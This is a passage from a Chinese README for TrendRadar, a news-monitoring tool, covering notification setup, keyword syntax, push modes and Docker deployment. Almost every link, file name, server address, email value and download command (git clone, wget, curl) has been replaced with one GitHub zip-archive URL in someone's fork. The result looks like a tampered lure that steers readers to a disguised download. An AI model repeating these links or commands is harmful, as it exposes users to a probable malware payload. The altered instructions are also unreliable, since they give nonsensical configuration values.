   - `EMAIL_SMTP_SERVER`：如 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   - `EMAIL_SMTP_PORT`：如 587（TLS）或 465（SSL）
   <br>

   **如果有多个收件人(注意是英文逗号分隔)**：
   - EMAIL_TO="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip,https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip,https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"

   </details>

   <details>
   <summary>👉 点击展开：<strong>ntfy 推送</strong>（开源免费，支持自托管）</summary>
   <br>

   **两种使用方式：**

   ### 方式一：免费使用（推荐新手） 🆓

   **特点**：
   - ✅ 无需注册账号，立即使用
   - ✅ 每天 250 条消息（足够 90% 用户）
   - ✅ Topic 名称即"密码"（需选择不易猜测的名称）
   - ⚠️ 消息未加密，不适合敏感信息, 但适合我们这个项目的不敏感信息

   **快速开始：**

   1. **下载 ntfy 应用**：
      - Android：[Google Play](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) / [F-Droid](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
      - iOS：[App Store](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
      - 桌面：访问 [https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

   2. **订阅主题**（选择一个难猜的名称）：
      ```
      建议格式：trendradar-{你的名字缩写}-{随机数字}
   
      不能使用中文
      
      ✅ 好例子：trendradar-zs-8492
      ❌ 坏例子：news、alerts（太容易被猜到）
      ```

   3. **配置 GitHub Secret（⚠️ Name 名称必须严格一致）**：
      - **Name（名称）**：`NTFY_TOPIC`（请复制粘贴此名称，不要手打）
      - **Secret（值）**：填写你刚才订阅的主题名称

      - **Name（名称）**：`NTFY_SERVER_URL`（可选配置，请复制粘贴此名称）
      - **Secret（值）**：留空（默认使用 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）

      - **Name（名称）**：`NTFY_TOKEN`（可选配置，请复制粘贴此名称）
      - **Secret（值）**：留空

      **说明**：ntfy 至少需要配置 1 个必需 Secret (NTFY_TOPIC)，后两个为可选配置

   4. **测试**：
      ```bash
      curl -d "测试消息" https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip你的主题名称
      ```

   ---

   ### 方式二：自托管（完全隐私控制） 🔒

   **适合人群**：有服务器、追求完全隐私、技术能力强

   **优势**：
   - ✅ 完全开源（Apache 2.0 + GPLv2）
   - ✅ 数据完全自主控制
   - ✅ 无任何限制
   - ✅ 零费用

   **Docker 一键部署**：
   ```bash
   docker run -d \
     --name ntfy \
     -p 80:80 \
     -v /var/cache/ntfy:/var/cache/ntfy \
     binwiederhier/ntfy \
     serve --cache-file https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   ```

   **配置 TrendRadar**：
   ```yaml
   NTFY_SERVER_URL: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   NTFY_TOPIC: trendradar-alerts  # 自托管可用简单名称
   NTFY_TOKEN: tk_your_token  # 可选：启用访问控制
   ```

   **在应用中订阅**：
   - 点击"Use another server"
   - 输入你的服务器地址
   - 输入主题名称
   - （可选）输入登录凭据

   ---

   **常见问题：**

   <details>
   <summary><strong>Q1: 免费版够用吗？</strong></summary>

   每天 250 条消息对大多数用户足够。按 30 分钟抓取一次计算，每天约 48 次推送，完全够用。
   </details>

   <details>
   <summary><strong>Q2: Topic 名称真的安全吗？</strong></summary>

   如果你选择随机的、足够长的名称（如 `trendradar-zs-8492-news`），暴力破解几乎不可能：
   - ntfy 有严格的速率限制（1 秒 1 次请求）
   - 64 个字符选择（A-Z, a-z, 0-9, _, -）
   - 10 位随机字符串有 64^10 种可能性（需要数年才能破解）
   </details>

   ---

   **推荐选择：**

   | 用户类型 | 推荐方案 | 理由 |
   |---------|---------|------|
   | 普通用户 | 方式一（免费） | 简单快速，够用 |
   | 技术用户 | 方式二（自托管） | 完全控制，无限制 |
   | 高频用户 | 方式三（付费） | 这个自己去官网看吧 |

   **相关链接：**
   - [ntfy 官方文档](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
   - [自托管教程](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
   - [GitHub 仓库](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

   </details>

   <details>
   <summary>👉 点击展开：<strong>Bark 推送</strong>（iOS 专属，简洁高效）</summary>
   <br>

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`BARK_URL`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：你的 Bark 推送 URL

   <br>

   **Bark 简介：**

   Bark 是一款 iOS 平台的免费开源推送工具，特点是简单、快速、无广告。

   **使用方式：**

   ### 方式一：使用官方服务器（推荐新手） 🆓

   1. **下载 Bark App**：
      - iOS：[App Store](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip给你的手机发推送/id1403753865)

   2. **获取推送 URL**：
      - 打开 Bark App
      - 复制首页显示的推送 URL（格式如：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`）
      - 将 URL 配置到 GitHub Secrets 中的 `BARK_URL`

   ### 方式二：自建服务器（完全隐私控制） 🔒

   **适合人群**：有服务器、追求完全隐私、技术能力强

   **Docker 一键部署**：
   ```bash
   docker run -d \
     --name bark-server \
     -p 8080:8080 \
     finab/bark-server
   ```

   **配置 TrendRadar**：
   ```yaml
   BARK_URL: http://your-server-ip:8080/your_device_key
   ```

   ---

   **注意事项：**
   - ✅ Bark 使用 APNs 推送，单条消息最大 4KB
   - ✅ 支持自动分批推送，无需担心消息过长
   - ✅ 推送格式为纯文本（自动去除 Markdown 语法）
   - ⚠️ 仅支持 iOS 平台

   **相关链接：**
   - [Bark 官方网站](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
   - [Bark GitHub 仓库](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
   - [Bark Server 自建教程](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

   </details>

   <details>
   <summary>👉 点击展开：<strong>Slack 推送</strong></summary>
   <br>

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`SLACK_WEBHOOK_URL`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：你的 Slack Incoming Webhook URL

   <br>

   **Slack 简介：**

   Slack 是团队协作工具，Incoming Webhooks 可以将消息推送到 Slack 频道。

   **设置步骤：**

   ### 步骤 1：创建 Slack App

   1. **访问 Slack API 页面**：
      - 打开 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
      - 如果未登录，先登录你的 Slack 工作空间

   2. **选择创建方式**：
      - 点击 **"From scratch"**（从头开始创建）

   3. **填写 App 信息**：
      - **App Name**：填写应用名称（如 `TrendRadar` 或 `热点新闻监控`）
      - **Workspace**：从下拉列表选择你的工作空间
      - 点击 **"Create App"** 按钮

   ### 步骤 2：启用 Incoming Webhooks

   1. **导航到 Incoming Webhooks**：
      - 在左侧菜单中找到并点击 **"Incoming Webhooks"**

   2. **启用功能**：
      - 找到 **"Activate Incoming Webhooks"** 开关
      - 将开关从 `OFF` 切换到 `ON`
      - 页面会自动刷新显示新的配置选项

   ### 步骤 3：生成 Webhook URL

   1. **添加新的 Webhook**：
      - 滚动到页面底部
      - 点击 **"Add New Webhook to Workspace"** 按钮

   2. **选择目标频道**：
      - 系统会弹出授权页面
      - 从下拉列表中选择要接收消息的频道（如 `#热点新闻`）
      - ⚠️ 如果要选择私有频道，必须先加入该频道

   3. **授权应用**：
      - 点击 **"Allow"** 按钮完成授权
      - 系统会自动跳转回配置页面

   ### 步骤 4：复制并保存 Webhook URL

   1. **查看生成的 URL**：
      - 在 "Webhook URLs for Your Workspace" 区域
      - 会看到刚刚生成的 Webhook URL
      - 格式如：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`

   2. **复制 URL**：
      - 点击 URL 右侧的 **"Copy"** 按钮
      - 或手动选中 URL 并复制

   3. **配置到 TrendRadar**：
      - **GitHub Actions**：将 URL 添加到 GitHub Secrets 中的 `SLACK_WEBHOOK_URL`
      - **本地测试**：将 URL 填入 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `slack_webhook_url` 字段
      - **Docker 部署**：将 URL 添加到 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件的 `SLACK_WEBHOOK_URL` 变量

   ---

   **注意事项：**
   - ✅ 支持 Markdown 格式（自动转换为 Slack mrkdwn）
   - ✅ 支持自动分批推送（每批 4KB）
   - ✅ 适合团队协作，消息集中管理
   - ⚠️ Webhook URL 包含密钥，切勿公开

   **消息格式预览：**
   ```
   *[第 1/2 批次]*

   📊 *热点词汇统计*

   🔥 *[1/3] AI ChatGPT* : 2 条

     1. [百度热搜] 🆕 ChatGPT-5正式发布 *[1]* - 09时15分 (1次)

     2. [今日头条] AI芯片概念股暴涨 *[3]* - [08时30分 ~ 10时45分] (3次)
   ```

   **相关链接：**
   - [Slack Incoming Webhooks 官方文档](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
   - [Slack API 应用管理](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

   </details>

3. **手动测试新闻推送**：

   > 💡 **完成第1-2步后，请立即测试！** 测试成功后再根据需要调整配置（第4步）。
   >
   > ⚠️ **重要提醒：请进入你自己 fork 的项目，不是本项目！**

   **如何找到你的 Actions 页面**：

   - **方法一**：打开你 fork 的项目主页，点击顶部的 **Actions** 标签
   - **方法二**：直接访问 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip你的用户名/TrendRadar/actions`

   **示例对比**：
   - ❌ 作者的项目：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
   - ✅ 你的项目：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip你的用户名/TrendRadar/actions`

   **测试步骤**：
   1. 进入你项目的 Actions 页面
   2. 找到 **"Get Hot News"**(必须得是这个字)点进去，点击右侧的 **"Run workflow"** 按钮运行 
      - 如果看不到该字样，参照 [#109](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 解决
   3. 3 分钟左右，消息会推送到你配置的平台

   <br>

   > ⏱️ **测试提示**：
   > - 手动测试不要太频繁，避免触发 GitHub Actions 限制
   > - 点击 Run workflow 后需要**刷新浏览器页面**才能看到新的运行记录

4. **配置说明（可选）**：

    > 💡 **默认配置已可正常使用**，如需个性化调整，了解以下三个文件即可

    | 文件 | 作用 |
    |------|------|
    | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 主配置文件：推送模式、时间窗口、平台列表、热点权重等 |
    | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 关键词文件：设置你关心的词汇，筛选推送内容 |
    | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 执行频率：控制多久运行一次（⚠️ 谨慎修改） |

    👉 **详细配置教程**：[配置详解](#配置详解)

5. **🎉 部署成功！分享你的使用体验**

   恭喜你完成了 TrendRadar 的配置！现在你可以开始追踪热点资讯了。

   💬 **有更多小伙伴在公众号交流使用心得，期待你的分享~**

   - 想了解更多玩法和高级技巧？
   - 遇到问题需要快速解答？
   - 有好的想法想要交流？

   👉 **欢迎关注公众号「硅基茶水间」**，你的点赞和留言都是项目持续更新的动力。

   详细的交流方式，请查看 → [问题答疑与交流](#问题答疑与交流)

6. **想要更智能的分析？试试 AI 增强功能**（可选）

   基础配置已经能满足日常使用，但如果你想要：

   - 📊 让 AI 自动分析热点趋势和数据洞察
   - 🔍 通过自然语言搜索和查询新闻
   - 💡 获得情感分析、话题预测等深度分析
   - ⚡ 在 Claude、Cursor 等 AI 工具中直接调用数据

   👉 **了解更多**：[AI 智能分析](#-ai-智能分析) — 解锁项目的隐藏能力，让热点追踪更高效！

<br>

<a name="配置详解"></a>

## ⚙️ 配置详解

> **📖 提醒**：本章节提供详细的配置说明，建议先完成 [快速开始](#-快速开始) 的基础配置，再根据需要回来查看详细选项。

### 1. 平台配置

<details id="自定义监控平台">
<summary>👉 点击展开：<strong>自定义监控平台</strong></summary>
<br>

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `platforms` 部分

本项目的资讯数据来源于 [newsnow](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) ，你可以点击[网站](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)，点击[更多]，查看是否有你想要的平台。

具体添加可访问 [项目源代码](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)，根据里面的文件名，在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件中修改 `platforms` 配置：

```yaml
platforms:
  - id: "toutiao"
    name: "今日头条"
  - id: "baidu"
    name: "百度热搜"
  - id: "wallstreetcn-hot"
    name: "华尔街见闻"
  # 添加更多平台...
```

> 💡 **快捷方式**：如果不会看源代码，可以复制他人整理好的 [平台配置汇总](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

> ⚠️ **注意**：平台不是越多越好，建议选择 10-15 个核心平台。过多平台会导致信息过载，反而降低使用体验。

</details>

### 2. 关键词配置

在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件中配置监控的关键词，支持五种语法、区域标记和词组功能。

| 语法类型 | 符号 | 作用 | 示例 | 匹配逻辑 |
|---------|------|------|------|---------|
| **普通词** | 无 | 基础匹配 | `华为` | 包含任意一个即可 |
| **必须词** | `+` | 限定范围 | `+手机` | 必须同时包含 |
| **过滤词** | `!` | 排除干扰 | `!广告` | 包含则直接排除 |
| **数量限制** | `@` | 控制显示数量 | `@10` | 最多显示10条新闻（v3.2.0新增） |
| **全局过滤** | `[GLOBAL_FILTER]` | 全局排除指定内容 | 见下方示例 | 任何情况下都过滤（v3.5.0新增） |

#### 2.1 基础语法

<a name="关键词基础语法"></a>

<details>
<summary>👉 点击展开：<strong>基础语法教程</strong></summary>
<br>

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`

##### 1. **普通关键词** - 基础匹配
```txt
华为
OPPO
苹果
```
**作用：** 新闻标题包含其中**任意一个词**就会被捕获

##### 2. **必须词** `+词汇` - 限定范围
```txt
华为
OPPO
+手机
```
**作用：** 必须同时包含普通词**和**必须词才会被捕获

##### 3. **过滤词** `!词汇` - 排除干扰
```txt
苹果
华为
!水果
!价格
```
**作用：** 包含过滤词的新闻会被**直接排除**，即使包含关键词

##### 4. **数量限制** `@数字` - 控制显示数量（v3.2.0 新增）
```txt
特斯拉
马斯克
@5
```
**作用：** 限制该关键词组最多显示的新闻条数

**配置优先级：** `@数字` > 全局配置 > 不限制

##### 5. **全局过滤** `[GLOBAL_FILTER]` - 全局排除指定内容（v3.5.0 新增）
```txt
[GLOBAL_FILTER]
广告
推广
营销
震惊
标题党

[WORD_GROUPS]
科技
AI

华为
鸿蒙
!车
```
**作用：** 在任何情况下过滤包含指定词的新闻，**优先级最高**

**使用场景：**
- 过滤低质内容：震惊、标题党、爆料等
- 过滤营销内容：广告、推广、赞助等
- 过滤特定主题：娱乐、八卦（根据需求）

**过滤优先级：** 全局过滤 > 词组内过滤(`!`) > 词组匹配

**区域说明：**
- `[GLOBAL_FILTER]`：全局过滤区，包含的词在任何情况下都会被过滤
- `[WORD_GROUPS]`：词组区，保持现有语法（`!`、`+`、`@`）
- 如果不使用区域标记，默认全部作为词组处理（向后兼容）

**匹配示例：**
```txt
[GLOBAL_FILTER]
广告

[WORD_GROUPS]
科技
AI
```
- ❌ "广告：最新科技产品发布" ← 包含全局过滤词"广告"，直接拒绝
- ✅ "科技公司发布AI新产品" ← 不包含全局过滤词，匹配"科技"词组
- ✅ "AI技术突破引发关注" ← 不包含全局过滤词，匹配"科技"词组中的"AI"

**注意事项：**
- 全局过滤词应谨慎使用，避免过度过滤导致遗漏有价值内容
- 建议全局过滤词控制在 5-15 个以内
- 对于特定词组的过滤，优先使用词组内过滤词（`!` 前缀）

---

#### 🔗 词组功能 - 空行分隔的重要作用

**核心规则：** 用**空行**分隔不同的词组，每个词组独立统计

##### 示例配置：
```txt
iPhone
华为
OPPO
+发布

A股
上证
深证
+涨跌
!预测

世界杯
欧洲杯
亚洲杯
+比赛
```

##### 词组解释及匹配效果：

**第1组 - 手机新品类：**
- 关键词：iPhone、华为、OPPO
- 必须词：发布
- 效果：必须包含手机品牌名，同时包含"发布"

**匹配示例：**
- ✅ "iPhone 15正式发布售价公布" ← 有"iPhone"+"发布"
- ✅ "华为Mate60系列发布会直播" ← 有"华为"+"发布"
- ✅ "OPPO Find X7发布时间确定" ← 有"OPPO"+"发布"
- ❌ "iPhone销量创新高" ← 有"iPhone"但缺少"发布"

**第2组 - 股市行情类：**
- 关键词：A股、上证、深证
- 必须词：涨跌
- 过滤词：预测
- 效果：关注股市涨跌实况，排除预测类内容

**匹配示例：**
- ✅ "A股今日大幅涨跌分析" ← 有"A股"+"涨跌"
- ✅ "上证指数涨跌幅创新高" ← 有"上证"+"涨跌"
- ❌ "专家预测A股涨跌趋势" ← 有"A股"+"涨跌"但包含"预测"

**第3组 - 足球赛事类：**
- 关键词：世界杯、欧洲杯、亚洲杯
- 必须词：比赛
- 效果：只关注比赛相关新闻

---

#### 📝 配置技巧

##### 1. **从宽到严**
```txt
# 第一步：先用宽泛关键词测试
人工智能
AI
ChatGPT

# 第二步：发现误匹配后，加入必须词限定
人工智能
AI
ChatGPT
+技术

# 第三步：发现干扰内容后，加入过滤词
人工智能
AI
ChatGPT
+技术
!广告
!培训
```

##### 2. **避免过度复杂**

❌ **不推荐：** 一个词组包含太多词汇
```txt
华为
OPPO
苹果
三星
vivo
一加
魅族
+手机
+发布
+销量
!假货
!维修
!二手
```

✅ **推荐：** 拆分成多个精确的词组
```txt
华为
OPPO
+新品

苹果
三星
+发布

手机
销量
+市场
```

</details>

#### 2.2 高级配置（v3.2.0 新增）

<a name="关键词高级配置"></a>

<details>
<summary>👉 点击展开：<strong>高级配置教程</strong></summary>
<br>

##### 关键词排序优先级

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`

```yaml
report:
  sort_by_position_first: false  # 排序优先级配置
```

| 配置值 | 排序规则 | 适用场景 |
|--------|---------|---------|
| `false`（默认） | 热点条数 ↓ → 配置位置 ↑ | 关注热度趋势 |
| `true` | 配置位置 ↑ → 热点条数 ↓ | 关注个人优先级 |

**示例：** 配置顺序 A、B、C，热点数 A(3条)、B(10条)、C(5条)
- `false`：B(10条) → C(5条) → A(3条)
- `true`：A(3条) → B(10条) → C(5条)

##### 全局显示数量限制

```yaml
report:
  max_news_per_keyword: 10  # 每个关键词最多显示10条（0=不限制）
```

**Docker 环境变量：**
```bash
SORT_BY_POSITION_FIRST=true
MAX_NEWS_PER_KEYWORD=10
```

**综合示例：**
```yaml
# https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
report:
  sort_by_position_first: true   # 按配置顺序优先
  max_news_per_keyword: 10       # 全局默认每个关键词最多10条
```

```txt
# https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
特斯拉
马斯克
@20              # 重点关注，显示20条（覆盖全局配置）

华为            # 使用全局配置，显示10条

比亚迪
@5               # 限制5条
```

**最终效果：** 按配置顺序显示 特斯拉(20条) → 华为(10条) → 比亚迪(5条)

</details>

### 3. 推送模式详解

<details>
<summary>👉 点击展开：<strong>三种推送模式详细对比</strong></summary>
<br>

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`

```yaml
report:
  mode: "daily"  # 可选: "daily" | "incremental" | "current"
```

**Docker 环境变量：** `REPORT_MODE=incremental`

#### 详细对比表格

| 模式 | 适用人群 | 推送时机 | 显示内容 | 典型使用场景 |
|------|----------|----------|----------|------------|
| **当日汇总**<br/>`daily` | 📋 企业管理者/普通用户 | 按时推送(默认每小时推送一次) | 当日所有匹配新闻<br/>+ 新增新闻区域 | **案例**：每天下午6点查看今天所有重要新闻<br/>**特点**：看全天完整趋势，不漏掉任何热点<br/>**提醒**：会包含之前推送过的新闻 |
| **当前榜单**<br/>`current` | 📰 自媒体人/内容创作者 | 按时推送(默认每小时推送一次) | 当前榜单匹配新闻<br/>+ 新增新闻区域 | **案例**：每小时追踪"哪些话题现在最火"<br/>**特点**：实时了解当前热度排名变化<br/>**提醒**：持续在榜的新闻每次都会出现 |
| **增量监控**<br/>`incremental` | 📈 投资者/交易员 | 有新增才推送 | 新出现的匹配频率词新闻 | **案例**：监控"特斯拉"，只在有新消息时通知<br/>**特点**：零重复，只看首次出现的新闻<br/>**适合**：高频监控、避免信息打扰 |

#### 实际推送效果举例

假设你监控"苹果"关键词，每小时执行一次：

| 时间 | daily 模式推送 | current 模式推送 | incremental 模式推送 |
|-----|--------------|----------------|-------------------|
| 10:00 | 新闻A、新闻B | 新闻A、新闻B | 新闻A、新闻B |
| 11:00 | 新闻A、新闻B、新闻C | 新闻B、新闻C、新闻D | **仅**新闻C |
| 12:00 | 新闻A、新闻B、新闻C | 新闻C、新闻D、新闻E | **仅**新闻D、新闻E |

**说明**：
- `daily`：累积展示当天所有新闻（A、B、C 都保留）
- `current`：展示当前榜单的新闻（排名变化，新闻D上榜，新闻A掉榜）
- `incremental`：**只推送新出现的新闻**（避免重复干扰）

#### 常见问题

> **💡 遇到这个问题？** 👉 "每个小时执行一次，第一次执行完输出的新闻，在下一个小时执行时还会出现"
> - **原因**：你可能选择了 `daily`（当日汇总）或 `current`（当前榜单）模式
> - **解决**：改用 `incremental`（增量监控）模式，只推送新增内容

#### ⚠️ 增量模式重要提示

> **选择了 `incremental`（增量监控）模式的用户请注意：**
>
> 📌 **增量模式只在有新增匹配新闻时才会推送**
>
> **如果长时间没有收到推送，可能是因为：**
> 1. 当前时段没有符合你关键词的新热点出现
> 2. 关键词配置过于严格或过于宽泛
> 3. 监控平台数量较少
>
> **解决方案：**
> - 方案1：👉 [优化关键词配置](#2-关键词配置) - 调整关键词的精准度，增加或修改监控词汇
> - 方案2：切换推送模式 - 改用 `current` 或 `daily` 模式，可以定时接收推送
> - 方案3：👉 [增加监控平台](#1-平台配置) - 添加更多新闻平台，扩大信息来源

</details>

### 4. 热点权重调整

<details>
<summary>👉 点击展开：<strong>热点权重调整</strong></summary>
<br>

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `weight` 部分

```yaml
weight:
  rank_weight: 0.6       # 排名权重
  frequency_weight: 0.3  # 频次权重
  hotness_weight: 0.1    # 热度权重
```

当前默认的配置是平衡性配置

#### 两个核心场景

**追实时热点型**：
```yaml
weight:
  rank_weight: 0.8    # 主要看排名
  frequency_weight: 0.1  # 不太在乎持续性
  hotness_weight: 0.1
```
**适用人群**：自媒体博主、营销人员、想快速了解当下最火话题的用户

**追深度话题型**：
```yaml
weight:
  rank_weight: 0.4    # 适度看排名
  frequency_weight: 0.5  # 重视当天内的持续热度
  hotness_weight: 0.1
```
**适用人群**：投资者、研究人员、新闻工作者、需要深度分析趋势的用户

#### 调整的方法
1. **三个数字加起来必须等于 1.0**
2. **哪个重要就调大哪个**：在乎排名就调大 rank_weight，在乎持续性就调大 frequency_weight
3. **建议每次只调 0.1-0.2**，观察效果

核心思路：追求速度和时效性的用户提高排名权重，追求深度和稳定性的用户提高频次权重。

</details>

### 5. 推送格式参考

<details>
<summary>👉 点击展开：<strong>推送格式说明</strong></summary>
<br>

#### 推送示例

📊 热点词汇统计

🔥 [1/3] AI ChatGPT : 2 条

  1. [百度热搜] 🆕 ChatGPT-5正式发布 [**1**] - 09时15分 (1次)

  2. [今日头条] AI芯片概念股暴涨 [**3**] - [08时30分 ~ 10时45分] (3次)

━━━━━━━━━━━━━━━━━━━

📈 [2/3] 比亚迪 特斯拉 : 2 条

  1. [微博] 🆕 比亚迪月销量破纪录 [**2**] - 10时20分 (1次)

  2. [抖音] 特斯拉降价促销 [**4**] - [07时45分 ~ 09时15分] (2次)

━━━━━━━━━━━━━━━━━━━

📌 [3/3] A股 股市 : 1 条

  1. [华尔街见闻] A股午盘点评分析 [**5**] - [11时30分 ~ 12时00分] (2次)

🆕 本次新增热点新闻 (共 2 条)

**百度热搜** (1 条):
  1. ChatGPT-5正式发布 [**1**]

**微博** (1 条):
  1. 比亚迪月销量破纪录 [**2**]

更新时间：2025-01-15 12:30:15

#### 消息格式说明

| 格式元素      | 示例                        | 含义         | 说明                                    |
| ------------- | --------------------------- | ------------ | --------------------------------------- |
| 🔥📈📌        | 🔥 [1/3] AI ChatGPT        | 热度等级     | 🔥高热度(≥10条) 📈中热度(5-9条) 📌普通热度(<5条) |
| [序号/总数]   | [1/3]                       | 排序位置     | 当前词组在所有匹配词组中的排名          |
| 频率词组      | AI ChatGPT                  | 关键词组     | 配置文件中的词组，标题必须包含其中词汇   |
| : N 条        | : 2 条                      | 匹配数量     | 该词组匹配的新闻总数                    |
| [平台名]      | [百度热搜]                  | 来源平台     | 新闻所属的平台名称                      |
| 🆕            | 🆕 ChatGPT-5正式发布        | 新增标记     | 本轮抓取中首次出现的热点                |
| [**数字**]    | [**1**]                     | 高排名       | 排名≤阈值的热搜，红色加粗显示           |
| [数字]        | [7]                         | 普通排名     | 排名>阈值的热搜，普通显示               |
| - 时间        | - 09时15分                  | 首次时间     | 该新闻首次被发现的时间                  |
| [时间~时间]   | [08时30分 ~ 10时45分]       | 持续时间     | 从首次出现到最后出现的时间范围          |
| (N次)         | (3次)                       | 出现频率     | 在监控期间出现的总次数                  |
| **新增区域**  | 🆕 **本次新增热点新闻**      | 新话题汇总   | 单独展示本轮新出现的热点话题            |

</details>


### 6. Docker 部署

<details>
<summary>👉 点击展开：<strong>Docker 部署完整指南</strong></summary>
<br>

**镜像说明：**

TrendRadar 提供两个独立的 Docker 镜像，可根据需求选择部署：

| 镜像名称 | 用途 | 说明 |
|---------|------|------|
| `wantcat/trendradar` | 新闻推送服务 | 定时抓取新闻、推送通知（必选） |
| `wantcat/trendradar-mcp` | AI 分析服务 | MCP 协议支持、AI 对话分析（可选） |

> 💡 **建议**：
> - 只需要推送功能：仅部署 `wantcat/trendradar` 镜像
> - 需要 AI 分析功能：同时部署两个镜像

---

#### 方式一：使用 docker compose（推荐）

1. **创建项目目录和配置**:

   **方式 1-A：使用 git clone（推荐，最简单）**
   ```bash
   # 克隆项目到本地
   git clone https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
   cd TrendRadar
   ```

   **方式 1-B：使用 wget 下载配置文件**
   ```bash
   # 创建目录结构
   mkdir -p trendradar/{config,docker}
   cd trendradar

   # 下载配置文件模板
   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip -P config/
   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip -P config/

   # 下载 docker compose 配置
